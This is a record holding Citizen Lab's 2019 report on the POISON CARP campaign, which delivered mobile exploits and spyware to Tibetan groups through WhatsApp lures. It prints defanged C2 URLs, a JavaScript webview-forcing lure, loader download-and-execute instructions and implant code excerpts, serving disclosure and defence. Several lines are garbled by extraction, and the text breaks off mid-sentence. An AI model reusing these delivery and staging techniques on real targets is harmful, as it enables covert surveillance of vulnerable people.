{
    "id": "fb56f7db-cc4e-4348-bd01-a0a982ef9b81",
    "created_at": "2023-01-12T15:01:12.773686Z",
    "updated_at": "2025-03-27T02:16:28.873039Z",
    "deleted_at": null,
    "sha1_hash": "9c8a682b5d2178909f26603d78ad8d2c19747496",
    "title": "2019-09-24 - Missing Link Tibetan Groups Targeted with 1-Click Mobile Exploits",
    "authors": "",
    "file_creation_date": "2022-05-28T15:40:07Z",
    "file_modification_date": "2022-05-28T15:40:07Z",
    "file_size": 3551543,
    "plain_text": "# Missing Link Tibetan Groups Targeted with 1-Click Mobile Exploits\n\n**citizenlab.ca/2019/09/poison-carp-tibetan-groups-targeted-with-1-click-mobile-exploits/**\n\n[Research](https://citizenlab.ca/category/research/)\n\n\nSeptember 24, 2019\n\n\n-----\n\n[Targeted Threats](https://citizenlab.ca/category/research/targeted-threats/)\nBy [Bill Marczak,](https://citizenlab.ca/author/bmarczak/) [Adam Hulcoop,](https://citizenlab.ca/author/adam-hulcoop/) [Etienne Maynier,](https://citizenlab.ca/author/etiennemaynier/) [Bahr Abdul Razzak,](https://citizenlab.ca/author/bahrabdulrazzak/) [Masashi Crete-Nishihata,](https://citizenlab.ca/author/masashi/) [John Scott-Railton, and](https://citizenlab.ca/author/jsrailton/) [Ron Deibert](https://citizenlab.ca/author/profd/)\nSeptember 24, 2019\n[Download this report](https://tspace.library.utoronto.ca/bitstream/1807/102535/1/Report%23123--missinglink.pdf)\n\n## Key Findings\n\nBetween November 2018 and May 2019, senior members of Tibetan groups received malicious links in individually tailored WhatsApp\ntext exchanges with operators posing as NGO workers, journalists, and other fake personas. The links led to code designed to exploit\nweb browser vulnerabilities to install spyware on iOS and Android devices, and in some cases to OAuth phishing pages. This campaign\nwas carried out by what appears to be a single operator that we call POISON CARP.\nWe observed POISON CARP employing a total of eight Android browser exploits and one Android spyware kit, as well as one iOS exploit\nchain and iOS spyware. None of the exploits that we observed were zero days. POISON CARP overlaps with two recently reported\ncampaigns against the Uyghur community. The iOS exploit and spyware we observed was used in watering hole attacks reported by\nGoogle Project Zero, and a website used to serve exploits by POISON CARP was also observed in a campaign called “Evil Eye”\nreported by Volexity. The Android malware used in the campaign is a fully featured spyware kit that has not been previously documented.\nPOISON CARP appears to have used Android browser exploits from a variety of sources. In one case, POISON CARP used a working\nexploit publicly released by Exodus Intelligence for a Google Chrome bug that was fixed in source, but whose patch had not yet been\ndistributed to Chrome users. In other cases, POISON CARP used lightly modified versions of Chrome exploit code published on the\npersonal GitHub pages of a member of Qihoo 360’s Vulcan Team, a member of Tencent’s Xuanwu Lab, and by a Google Project Zero\nmember on the Chrome Bug Tracker.\nThis campaign is the first documented case of one-click mobile exploits used to target Tibetan groups, and reflects an escalation in the\nsophistication of digital espionage threats targeting the community.\n\n## Summary\n\n[The Tibetan community has been besieged by digital espionage for over a decade. In 2009, the Information Warfare Monitor published the](https://isc.sans.edu/diary/Overview+of+cyber+attacks+against+Tibetan+communities/4177)\nreport [Tracking GhostNet, detailing a targeted malware operation that spied on Tibetan organisations including the Private Office of His](https://citizenlab.ca/2009/03/tracking-ghostnet-investigating-a-cyber-espionage-network/)\nHoliness the Dalai Lama in Dharamsala, India, as well as government offices in 103 countries. At the time there were very few public reports of\ntargeted malware campaigns and limited documentation of how these threats affected civil society.\n\nOver the past ten years, the tactics used in GhostNet have become familiar to Tibetans: emails laden with older exploits used to deliver custom\nmalware to unpatched computers. Typically, the malware used in these operations target Windows systems, with some rare incidents of\n[malware targeting MacOS and](https://targetedthreats.net/media/2-Extended%20Analysis-Full.pdf) [Android. A common thread between these espionage campaigns is a focus on clever social engineering rather](https://citizenlab.ca/2013/04/permission-to-spy-an-analysis-of-android-malware-targeting-tibetans/)\nthan the technical sophistication of exploits or malware.\n\nWhile these patterns are common, we have observed shifts in tactics seemingly tied to changes in the defensive posture of the community.\n[Historically, malware sent as email attachments was the most common threat Tibetan groups experienced. In response, groups in the](https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/hardy)\ncommunity promoted a user awareness campaign that advised the use of cloud platforms, such as Google Drive or DropBox, to share\ndocuments as an alternative to email attachments. Gradually, we observed a drop in malware campaigns against Tibetan groups and a rise in\ncredential phishing, suggesting that operators were changing their tactics in response. Recently, we have also observed campaigns using\n[malicious OAuth applications, potentially in an effort to bypass users who are using two-factor authentication on their Google accounts. These](https://citizenlab.ca/2018/01/spying-on-a-budget-inside-a-phishing-operation-with-targets-in-the-tibetan-community/#part3)\nchanges demonstrate an inherent asymmetry between the digital defenses of Tibetan groups and the capabilities of the operators who target\nthem: changing the behaviour of a community is a slow and gradual process, while an adversary can evolve overnight.\n\n[To address these challenges, Tibetan groups have recently formed the Tibetan Computer Emergency Readiness Team (TibCERT), a coalition](https://tibcert.org/)\nbetween Tibetan organisations to improve digital security through incident response collaboration and data sharing. In November 2018,\nTibCERT was notified of suspicious WhatsApp messages sent to senior members of Tibetan groups. With the consent of the targeted groups,\nTibCERT shared samples of these messages with Citizen Lab. Our analysis found that the messages included links designed to exploit and\n\n\n-----\n\nsta spy a e o o e a d d o d de ces e ca pa g appea s to be ca ed out by a s g e ope ato t at e ca O SO C e\ncampaign is the first documented case of one-click mobile exploits used to target Tibetan groups. It represents a significant escalation in social\nengineering tactics and technical sophistication compared to what we typically have observed being used against the Tibetan community.\n\nBetween November 2018 and September 2019, we collected one iOS exploit chain, one iOS spyware implant, eight distinct Android exploits,\nand an Android spyware package. The iOS exploit chain only affects iOS versions between 11.0 and 11.4, and was not a [zero-day exploit](https://www.fireeye.com/current-threats/what-is-a-zero-day-exploit.html)\n[when we observed it. The Android exploits include a working exploit publicly released by Exodus Intelligence for a Google Chrome bug that](https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity/)\nwas patched, but whose patch had not yet been distributed to Chrome users. Other exploits include what appears to be lightly modified\n[versions of Chrome exploit code published on the personal GitHub pages of a member of Tencent’s Xuanwu Lab (CVE-2016-1646), a member](https://github.com/4B5F5F4B/Exploits/blob/master/Chrome/CVE-2016-1646/exploit.html)\nof [Qihoo 360’s Vulcan Team (CVE-2018-17480), and by a Google Project Zero member on the Chrome Bug Tracker (CVE-2018-6065).](https://github.com/xuechiyaobai/V8_November_2017/blob/e30af61fffe3aeee1aeab523bd5bef83d6a71044/CVE-2017-5070/hello_chrome.html)\n\nThe exploits, spyware, and infrastructure used by POISON CARP link it to two recently reported digital espionage campaigns targeting Uyghur\n[groups. In August 2019, Google Project Zero reported on a digital espionage campaign identified by Google’s Threat Analysis Group that used](https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html)\ncompromised websites to serve iOS exploits (including a zero-day in one case) to visitors for the purpose of infecting their iPhones with\n[spyware. Subsequent media](https://techcrunch.com/2019/08/31/china-google-iphone-uyghur/) [reporting cited anonymous sources who stated that the campaign targeted the Uyghur community and that the](https://www.forbes.com/sites/thomasbrewster/2019/09/01/iphone-hackers-caught-by-google-also-targeted-android-and-microsoft-windows-say-sources/#7f3cae244adf)\nsame websites were being used to serve Android and Windows malware.1 [Following these reports, Volexity published details of a digital](https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/)\nespionage campaign against Uyghurs that used compromised websites to infect targets with Android malware. While Volexity did not provide\nany technical indicators that overlap with Google’s report, they speculated that the operator may be the same in both cases. Our report\nprovides these missing links.\n\n[POISON CARP used an iOS exploit chain identified in the Google Project Zero report, and used spyware that appears to be an earlier version](https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html)\n[of the implant sample described by Google. POISON CARP used the domain](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html) `msap[.]services to serve the iOS exploit, an indicator that`\n[Volexity’s report found in the code of a compromised Uyghur website. Based on these similarities, it is likely the campaigns were conducted by](https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/)\nthe same operator, or a coordinated group of operators, who have an interest in the activities of ethinic minority groups that are considered\nsensitive in the context of China’s security interests.\n\nThe report proceeds as follows:\n\nIn Section 1, we describe the social engineering tactics used to target the Tibetan community.\n**Section 2 provides an overview of the iOS exploit and spyware used in the campaign and highlights similarities with the tool set**\ndescribed in the Google Project Zero report.\n**Section 3 identifies the Android exploits and provides our analysis of the novel spyware payload used in the campaign.**\n**Section 4 describes a malicious OAuth Application designed to gain access to Gmail accounts that was observed once in the campaign.**\nFinally, we conclude in Section 5 with a discussion of the overlap between POISON CARP and the campaigns described by Google\nProject Zero and Volexity. We also consider the significance of mobile threats for the digital security of the Tibetan community, and civil\nsociety in general.\n\n## 1. Targeting\n\n[Between November 11-14, 2018, we observed 15 intrusion attempts against individuals from the Private Office of His Holiness the Dalai Lama,](https://www.dalailama.com/office)\nthe [Central Tibetan Administration, the](https://tibet.net/) [Tibetan Parliament, and Tibetan human rights groups. On April 22 and May 21 2019, we observed two](https://tibetanparliament.org/)\nadditional attempts. The majority of people who were targeted hold senior positions in their respective organizations.\n\nThe intrusion attempts arrived via WhatsApp messages from seven fake personas designed to appear as journalists, staff at international\nadvocacy organisations, volunteers to Tibetan human rights groups, and tourists to India. The fake personas exclusively used WhatsApp\nphone numbers with Hong Kong country codes (+852).\n\nThroughout the campaign, POISON CARP demonstrated significant effort in social engineering. The personas and messages were tailored to\nthe targets, and POISON CARP operators actively engaged in conversations and persistently attempted to infect targets. Overall, the ruse was\npersuasive: in eight of the 15 intrusion attempts, the targeted persons recall clicking the exploit link. Fortunately, all of these individuals were\nrunning non-vulnerable versions of iOS or Android, and were not infected.\n\n## A Fake Amnesty International Researcher\n\nOn November 13, 2018, a senior staff member at a Tibetan human rights group was contacted on WhatsApp from a previously unknown\nnumber. The persona claimed to be “Jason Wu,” head of the “Refugee Group” at Amnesty International’s Hong Kong branch. There does not\nappear to be any “Jason Wu” currently employed by Amnesty International.\n\n\n-----\n\nFigure 1: A social engineering attempt on November 13, 2018 shows the level of effort put into crafting a plausible deception.\nOnce the target replied (Figure 1), the persona quickly introduced the topic of a recent self-immolation in Tibet and claimed to be attempting to\nverify social media reports for use in an upcoming Amnesty International report on human rights in China, and for an upcoming statement\ncritical of the Chinese government’s treatment of ethnic minorities. Once the pretext was established, the operator shared a link shortened with\n```\nbit.ly . The link redirected to a page on www.msap[.]services that contained an iOS exploit chain targeted at versions 11.0 through 11.4.\n\n```\nThe target recalls clicking on the link, but was not infected because their iPhone was running iOS version 12.0.1. Perhaps because the\noperator did not observe a successful infection, they continued to converse with the target (Figure 2), sharing additional exploit links. Several\nhours later, the persona explained that they had confirmed information about the self-immolation with contacts at the Central Tibetan\nAdministration, which may have been an effort to make the interaction seem benign to the target.\n\nFigure 2: The fake “Jason Wu” persona send exploits links to a staff member of a Tibetan human rights group.\n\n## From iOS to Android Exploit Attempts\n\nIn another intrusion attempt, a staff member from the same Tibetan human rights organization was contacted by “Lucy Leung,” a persona\nmasquerading as a New York Times reporter seeking an interview. After a brief pretext, the persona sent the target an iOS intrusion attempt\nlinking directly to `www.msap[.]services (Figure 3).`\n\n\n-----\n\nFigure 3: After sending an iOS exploit link (left), the fake New York Times reporter persona sends an Android exploit link (right).\nThe persona persistently requested that the target click the link. The target recalls clicking on the link, but they were not infected as they were\nusing an Android device. The persona then sent an Android exploit link, this time disguising it via `bit.ly .`\n\n## 2. iOS Exploit Kit\n\nOf the 17 intrusion attempts we observed against Tibetan targets, 12 contained links to the iOS exploit. All but one of the attempts were sent\nbetween November 11-14, 2018, with the last attempt sent on April 22, 2019. The exploit links pointed to what appear to be unique shortcodes\non `www.msap[.]services (e.g.,` `http://www.msap[.]services/ZQfqzs ). Links were sometimes sent directly, and sometimes via URL`\nshorteners such as Bitly.\n\nRequesting a malicious link hosted on the `www.msap[.]services domain using an iPhone User-Agent string (iOS 11.0 – 11.4) returned a`\nvalid html page including two iframes: one full-sized iframe displaying a benign decoy webpage and an invisible iframe leading to an exploit\npage on a different website. Attempts to visit with other user agents we tested resulted in a 302 redirect to the decoy webpage. Attempts to\nvisit nonexistent short-links on the `www.msap[.]services domain resulted in a 302 redirect of the target’s browser to` `apple.com .`\n\nAs of September 6, 2019, the Bitly link statistics recorded 140 total clicks on the iOS exploit short links. We obtained a single iOS exploit chain\nfrom the links sent in November 2018. We were unable to obtain any malicious code from the April 2019 link. The exploit chain appeared to be\ndesigned to target iOS versions 11 – 11.4 on all iPhone models 6 – X, although we were unable to successfully infect an iPhone SE running\niOS 11.4 during testing. The first exploit in the chain was a WebKit JavaScriptCore exploit, which resulted in the loading of an iOS privilege\nescalation exploit chain that ultimately executed a spyware payload designed to steal data from a range of applications and services.\n\nWe reported the exploit chain to Apple shortly after discovering it in November 2018. Apple confirmed that both the browser and privilege\nescalation exploits had been patched as of iOS 11.4.1 in July 2018. The browser exploit used in the POISON CARP campaign appeared to\n[match an exploit described in the Google Project Zero report (JSC Exploit 4, related to WebKit issue](https://googleprojectzero.blogspot.com/2019/08/jsc-exploits.html) [185694). Apple further confirmed that the](https://bugs.webkit.org/show_bug.cgi?id=185694)\n[privilege escalation and sandbox escape exploit we encountered was identical to iOS Exploit Chain 3 from the Google report. Therefore, when](https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-3.html)\nthe exploit was deployed against Tibetan groups, it was not a zero-day and was at least four months out-of-date.\n\n## Encrypted Malcode Delivery\n\n[One noteworthy feature of the exploitation process was that the exploits and malcode were encrypted with an ECC Diffie-Hellman (ECDH) key](https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman)\nexchange between the target browser and the operator’s server (Figure 4). The encrypted delivery of the exploit and payload would prevent a\nnetwork intrusion detection system (such as those commonly used in enterprise settings) from detecting malicious code, and prevents analysts\n\n\n-----\n\no eco st uct g a d a a y g t e a c ous code o a et o t a c captu e a o e O cou se, a a ysts ca st e t act t e a c ous\ncode in other ways, such as from memory dumps or browser-based instrumentation.\n\nFigure 4 : ECDH key generation for protection of the iOS malcode.\n[The specific code for encrypted malcode delivery used by POISON CARP is based on a project called IronSquirrel developed by security](https://github.com/MRGEffitas/Ironsquirrel)\n[researcher Zoltan Balazs in 2017. However, the use of encrypted malcode delivery was first seen in 2015 in the Angler Exploit Kit and later in](https://securelist.com/attacking-diffie-hellman-protocol-implementation-in-the-angler-exploit-kit/72097/)\nseveral [other kits.](https://blog.trendmicro.com/trendlabs-security-intelligence/astrum-exploit-kit-abuses-diffie-hellman-key-exchange/)\n\n## Implant Analysis\n\n[The spyware implant we acquired from the exploit chain in November 2018 was similar, though not identical, to the implant described by](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)\nGoogle Project Zero researchers. Based on the technical details provided in the Google report, we believe the two implants represent the\nsame spyware program in different stages of development. The November 2018 version we obtained appears to represent a rudimentary\nstage of development: seemingly important methods that are unused, and the command and control (C2) implementation lacks even the most\n[basic capabilities. The Implant Teardown section of the Google Project Zero report shows a fairly full-featured implant. We highlight some](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)\ndifferences between the two samples below.\n\n### Initialisation\n\nThe main functionality of the implant is implemented in the `Service class. The class` `start method (Figure 5) initialises a timer using the`\n```\nstartTimer method to create a persistent execution loop.\n\n```\nFigure 5: Service:start method.\nOnce complete, the `start method carries out initial device information collection and upload to the C2 server, followed by collection and`\nupload of various application data including location data, contacts, call history, SMS history, and more.\n\n**IMPLANT COMPARISON: start method**\n\n\n-----\n\ne sta t et od t e p a t t at Goog e oject e o esea c e s a a y ed ( c e e e to as t e 0 e s o ) ad t e o o g\nstructure:\n```\n-[Service start] {\n [self startTimer];\n [self upload];\n}\n\n```\nIn this version, the initial device information collection takes place in the upload method, making the start method much simpler. The P0\nversion also appears to add a data retrieval method to obtain the contents of the Apple Mail application, something which is not found in the\nversion we analyzed.\n\nThe specific device information gathered during the implant initialisation, executed by the uploadDevice method, consists of:\n\niPhone model\niPhone name\niPhone serial number\niOS Version\nPhone number\nICCID of the SIM Card\nIMEI of the device\nNetwork connection method (wifi or cellular)\n\n**IMPLANT COMPARISON: data collection**\n\nIn the P0 version, the same device info was collected via the `uploadDevice method, however this version also collected two additional`\npieces of information:\n\nTotal disk space\nFree disk space\n\nDuring initial data collection and exfiltration, the implant contacts the C2 server using the `remotelist method to request a list of applications`\nfrom which the operator wishes to exfiltrate data. In the case where no list is returned, the implant has a predefined list of hardcoded\napplications which consists of:\n\nViber (com.viber)\nVoxer (com.rebelvox.voxer-lite)\nTelegraph (ph.telegra.Telegraph)\nGmail (com.google.Gmail)\nTwitter (com.atebits.Tweetie2)\nQQMail (com.tencent.qqmail)\nWhatsApp (net.whatsapp.WhatsApp)\n\n**IMPLANT COMPARISON: targeted applications**\n\nThe P0 version adds the following applications to the default list:\n\nYahoo Mail (com.yahoo.Aerogram)\nOutlook (com.microsoft.Office.Outlook)\nNetEase Mail Master (com.netease.mailmaster)\nSkype (com.skype.skype)\nFacebook (com.facebook.Facebook)\nWeChat (com.tencent.xin)\n\n### Command and (Lack of) Control\n\nOnce the persistence timer takes control of the run loop, two methods are called: `status and` `capp (Figure 6).`\n\n\n-----\n\nFigure 6: Run loop timer.\nThe `status method sends a heartbeat message to the C2 server containing the current network connection method (wifi or cellular).`\nKnowing whether the target is on wifi or cellular is important to operators, as exfiltrating large amounts of data using a cellular connection could\ntip off the target to the surveillance if they receive a data overage alert from their provider. Figure 7 shows the `status method.`\n\nFigure 7: Service:status method.\nIn our sample, this data is sent via (unencrypted) HTTP POST to a C2 server at `hxxp://66.42.58[.]59:9078/status .`\n\nThe other method called by the timer loop, `capp (Figure 8), issues a request to the C2 server, again using the` `remotelist method, to`\nrequest a list of applications from which the operator wishes to exfiltrate data.\n\nFigure 8: capp method.\nThe `remotelist method makes a call via HTTP POST, again unencrypted, to` `hxxp://66.42.58[.]59:9078/list . In our sample, this is`\nthe only function that the C2 server can utilise.\n\n**IMPLANT COMPARISON: command and control**\n\nIn the P0 version of the implant, the `timer handle method has a similar structure, however the` `capp method is renamed to` `cmds :`\n\n\n-----\n\n```\n  NSLog(@\"cmds\");\n  [self remotelist];\n  NSLog(@\"finally\");\n}\n\n```\nThe P0 version of the `remotelist method is significantly improved, and able to parse and handle a variety of commands from the command`\nand control server:\n\n[snip]\n```\ndata_obj = [json objectForKey:@\"data\"];\nNSLog(@\"data Result: %@\", data_obj);\ncmds_obj = [data_obj objectForKey:@\"cmds\"];\nNSLog(@\"cmds: %@\", cmds_obj);\nfor (cmd in cmds_obj) {\n  [self doCommand:cmd];\n}\n\n```\nThe P0 version passes received commands to the doCommand method, which is ultimately responsible for dispatching various data collection\nand exfiltration methods depending on the options chosen by the malware operator. A complete list of the commands available to the operator\n[are documented in the Google Project Zero report.](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)\n\n### Summary\n\nWe suspect that the implant we observed is in a rudimentary state of development, due to the seeming lack of C2 server communication\ncapabilities. There are numerous methods which appear, both in name and function, to have been designed to capture and exfiltrate specific\ndevice and application data. While they are called on the initial execution of the implant via the start method, they are not called again via any\ninteraction from the C2 server. Additionally, there are numerous utility methods with suggestive names that are never invoked:\n```\n   [Util:pathOfWhatsappData]\n   [Util:pathOfWhatsappGroup]\n   [Util:pathOfTwitterData]\n   [Util:pathOfProtonMailData]\n   [Util:pathOfProtonMailGroup]\n\n```\nGiven the enhancements in the implant version analyzed by the Google Project Zero team, we strongly suspect that our copy of the implant\nrepresents an earlier stage of development.\n\n## 3. MOONSHINE: Android Exploit Kit and Payload\n\nDuring the course of the campaign, POISON CARP sent targets four malicious links pointing to Android exploits via WhatsApp. While we did\nnot identify any shared infrastructure or code similarities between the iOS and Android exploits or payloads, it is clear that POISON CARP was\nusing both tools (Figure 3). We refer to the Android exploit and malware kit as MOONSHINE, given a number of Alcohol-related strings\nincluded by the developer. This kit has not been publicly described previous to this report.\n\nThe Android exploit links were links of the following form, where [MoonshineSite] was an IP address or domain name of a server running\nMOONSHINE, and [URL] was a Base64-encoded decoy URL where the user was redirected post-exploitation, or if exploitation failed:\n```\nhxxp://[MoonshineSite]:5000/web/info?org=[URL]\n\n```\n\nIf a target accessed the link using a Chrome-based Android browser, they received a webpage with the code in Figure 9, designed to coerce\ntheir device to open the exploit URL inside the Facebook app’s built-in Chrome-based web browser.\n\n\n-----\n\n```\n<script type=\"text/javascript\">\n $(function(){\n  function clicksp(){\n   $(\"#sp\").trigger(\"click\");\n  }\n  function jump(){\n   document.location=\"http://[MoonshineSite]:5000/web/info?click=1&org=[URL]\"\n}\n  setTimeout(clicksp, 200);\n  setTimeout(jump, 1000);\n});\n</script>\n<a href=\"fb://webview/?url=http://[MoonshineSite]:5000/web/info?org=[URL]\">\n<span id=\"sp\"></span></a>\n\n```\n**Figure 9: JavaScript attempts to force the URL to be opened in the Facebook app.**\n\nWhen the exploit URL was opened with an Android Facebook User-Agent header, MOONSHINE checked the header to see if the Chrome\nversion was vulnerable to one of eight different Chrome exploits (Table 1), which are all fixed in the latest Chrome version. Four of the\nMOONSHINE exploits are clearly copied from working exploit code posted by security researchers on bug trackers or GitHub pages. In\ncontrast to the iOS exploit architecture, the Android exploit and payload delivery was not encrypted with ECDH keys (or even HTTPS).\n\n**User**\n**Agent in**\n**Request** **Exploit Returned**\n\n\nChrome\n< 38\n\nChrome\n39 – 40\n\nChrome\n41\n\nChrome\n42 – 49\n\nChrome\n50\n\nChrome\n51 – 55\n\nChrome\n56 – 58\n\nChrome\n59 – 61\n\nChrome\n62 – 63\n\nChrome\n64 – 67\n\nChrome\n68 – 69\n\nChrome\n70\n\nChrome\n71-73\n\n\n(None)\n\n**[Exploit #1: Appears to include a CVE-2016-1646 exploit published on Kai Kang’s Github account (@4B5F5F4B) of Tencent’s](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1646)**\nXuanwu Lab.2\n\n(None)\n\n**Exploit #1**\n\n**[Exploit #2: Appears to be CVE-2016-5198, a bug](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5198)** [publicly credited to Tencent’s Keen Security Lab via Trend Micro’s Zero Day](https://chromereleases.googleblog.com/2016/11/stable-channel-update-for-desktop.html)\nInitiative and fixed in Chrome 54.0.2840.87. The author of the specific exploit used here is unknown, though there is substantial\ncode overlap with Exploit #1.\n\n**[Exploit #3: Appears to be CVE-2017-5030, a bug publicly credited to security researcher Brendon Tiszka. The author of the](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5030)**\nspecific exploit used here is unknown.\n\n**[Exploit #4: Appears to include a CVE-2017-5070 exploit published on Qixun Zhao’s Github account (@S0rryMybad) of Qihoo](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5070)**\n360’s Vulcan Team.\n\n(None)\n\n**[Exploit #5: Appears to include a CVE-2018-6065 exploit published on the Google Chrome bug tracker by Mark Brand of Google](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6065)**\nProject Zero.\n\n(None)\n\n**[Exploit #6: Appears to be CVE-2018-17463, a bug publicly credited to security researcher Samuel Groß. The author of the](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17463)**\nspecific exploit used here is unknown.\n\n**[Exploit #7: Appears to be CVE-2018-17480, a bug successfully exploited at the Tian Fu Cup PWN Contest. The bug is credited](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17480)**\nto Guang Gong (@oldfresher) of Qihoo 360’s Alpha Team, though the author of the specific exploit used here is unknown.\n\n**Exploit #8: Appears to be CVE-2019-5825, a bug publicly credited to several researchers at Tencent’s Keen Security Lab. The**\n[specific exploit used here was written and published by Exodus Intelligence after they examined the git log for Chrome’s](https://blog.exodusintel.com/2019/04/03/a-window-of-opportunity/)\nJavaScript engine, and found a vulnerability that had been fixed in source code, but whose patch had not yet shipped to Chrome\nusers.\n\n\n**Table 1: Chrome Exploits used in MOONSHINE**\n\nEach exploit ran the same shellcode, which downloaded an ARMv7 ELF binary file (which we call the Loader) from\n```\nhxxp://[MoonshineSite]:5000/dev/loader, and stored the binary in the Facebook app folder as\n\n```\n(/data/data/com.facebook.katana/[BinaryName]), where [BinaryName] is a random alphanumeric string. The shellcode then executed the\n\n\n-----\n\noade, pass g `ttp //[ oo s` `eS te] 5000/ a d /data/data/co` `aceboo` `ata a/[` `a y a e] as a gu` e ts\n\nWe also tried fetching the exploits using an Android User-Agent for Facebook Messenger. In that case, everything was the same, except the\nLoader was downloaded to the Facebook Messenger app folder ( /data/data/com.facebook.orca/[BinaryName] ), and this path was\npassed by the shellcode as the second argument to the Loader.\n\n## Android Implant Overview\n\nThe MOONSHINE Loader was the first in a series of intermediary staged malware binaries sequentially executed to deliver the ultimate\npayload: a fully featured Android spyware package called “Scotch” by its developers. Figure 10 provides an overview of the installation\nprocess.\n\nMOONSHINE is designed for stealthy rootless operation, by exploiting popular legitimate Android apps with built-in browsers that request\nsensitive permissions. MOONSHINE obtains persistence by overwriting an infrequently used shared library (.so) file in one of these apps with\nitself. When a targeted user opens the legitimate app after exploitation, the app loads the shared library into memory, which causes the\nspyware to activate. While code in subsequent stages of MOONSHINE suggests that it can be deployed against four apps (Facebook,\nFacebook Messenger, WeChat, and QQ), the exploit site we tested against did not deliver any exploits for WeChat or QQ User-Agent headers.\n\nThe ultimate spyware tool deployed by MOONSHINE, Scotch, is a modular Java application which uses the WebSocket protocol to\ncommunicate with its C2 server. The Scotch payload itself has limited espionage features, such as obtaining device information and uploading\nfiles from the infected device. However, as part of its initial contact with the C2, Scotch downloads additional plugins. During our analysis, we\nwere able to acquire two plugin packages, named “Bourbon.jar” and “IceCube.jar” which added functionality including exfiltrating SMS text\nmessages, address books, and call logs, and spying on the target through their phone’s camera, microphone, and GPS.\n\n## Loader Stage\n\nAfter the MOONSHINE Loader is installed, the Loader POSTs a check-in message to the C2 server using the path:\n```\nhxxp://[MoonshineSite]:5000/dev/loader/post .\n\n```\nThe C2 server response provides instructions to the Loader, including a URL from which to download and execute the next stage of the\nmalware chain (tdu= parameter), as well as a series of files to delete from the app folder (cf= parameter), which may be generated in certain\ncircumstances by different invocations of the Loader. When we POSTed a check-in message to a C2, we received the following instructions:\n```\nLD&l=/data/data/com.facebook.katana;rs=0;lf=;tdu=http://[MoonshineSite]:5000/im/lure;tn=.lure;cf=excit,s.r.zip,busybox,\ndebug.apk,.lure,libNetwork.so,report,;\n\n```\nThe instructions cause the Loader to download /im/lure into the Facebook app folder, and execute it. This binary was an ARMv7 ELF binary\nthat the developers refer to as Whisky based on strings in the binary.\n\n\n-----\n\nFigure 10: Multistage installation of the MOONSHINE spyware kit.\n\n## Whisky Stage\n\nWhisky’s first step is to determine which shared library (.so) file should be overwritten by the next stage of MOONSHINE — called “Bourbon”\nby developers — by determining the current application context from the current working directory (Table 2). If Whisky happens to be running\nas the root user on the Android device, then the target filename used is `/data/local/tmp/libbourbon.so .`\n\n**If current application is …** **Then write to this shared library filename:**\n```\n com.facebook.katana (Facebook) /data/data/com.facebook.katana/lib-xzs/libaborthooks.so\n com.facebook.orca (Facebook /data/data/com.facebook.orca/lib-xzs/liblog.so\n\n```\nMessenger)\n```\n com.tencent.mm (WeChat) /data/data/com.tencent.mm/app_tbs/core_share/libwebp_base.so\n com.tencent.mobileqq (QQ) /data/data/com.tencent.mobileqq/files/TencentVideoKit/armeabi/libckeygenerator.so\n\n```\n**Table 2: Application context to destination filename map.**\n\nThese destination filenames are chosen intentionally, and act as a method of persistence and covert execution. In the case of Facebook and\nFacebook Messenger, the shared library files in Table 2 are loaded when the apps start. After determining the destination filename, Whisky\nextracts Bourbon by following these high level steps:\n\n1. Determine the size, s, of the encrypted data chunk using the last 4 bytes of the file (Figure 11).\n[2. Read an XXTEA encryption key, k, from the 16 bytes preceding s.](https://en.wikipedia.org/wiki/XXTEA)\n3. Read the MD5 hash, m, of the encrypted data chunk from the 32 bytes preceding k.\n4. Extract s bytes preceding m, to obtain the encrypted Bourbon binary.\n5. Validate that the MD5 hash of the encrypted Bourbon binary matches m.\n6. Decrypt the binary using XXTEA algorithm with key k, to obtain the final Bourbon binary.\n\n\n-----\n\nFigure 11: The XXTEA key, MD5 hash, and file size stored in Whisky.\n\n## Bourbon Stage\n\nWhen a user opens the app that Bourbon has been implanted inside, e.g., Facebook, the\n\nApp loads the Bourbon library into the Android Runtime, which calls Bourbon’s _[JNI_Onload method. The JNI_Onload method in Bourbon](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)_\nextracts the next payload, named “Scotch”, from itself using the extractScotch method (Figure 12). The method takes the following steps:\n\n1. Determine the C2 server IP address, x, by converting the last 4 bytes of the Bourbon binary to decimal.\n2. Extract the size, s, of the Scotch payload from the 4 bytes preceding x.\n3. Read the MD5 hash, m, of the Scotch binary from the 32 bytes preceding s.>\n4. Extract s bytes preceding m, to obtain the Scotch payload.\n5. Validate that the MD5 hash of the extracted Scotch binary matches m.\n6. Create an instance of the `com.sec.whisky.Scotch class, passing the IP address x as an argument to the constructor.`\n\nFigure 12: The extractScotch method from the Bourbon binary.\nThe Scotch implant is written to disk in the directory for the app that Bourbon was implanted in, for example:\n```\n/data/data/com.facebook.katana/app_sikhywis_ca55200e/scotch.jar .\n\n## Scotch Stage\n\n```\nThe Scotch stage is the final implant, providing an extensible, persistent spyware tool. Upon loading, the Scotch implant generates two\nidentifiers: a `Whisky_ID, generated by taking the SHA256 hash of a random UUID value, and a` `Device_ID, constructed by taking the`\nSHA256 hash of a fingerprint string comprised of various values specific to the infected device. The implant then makes a connection to port\n[10011 on the C2 server using the WebSocket protocol, thereby allowing bi-directional communication between the implant and the C2 server.](https://en.wikipedia.org/wiki/WebSocket)\nUsing this WebSocket connection, Scotch sends an initial check-in message to the C2 server at the following 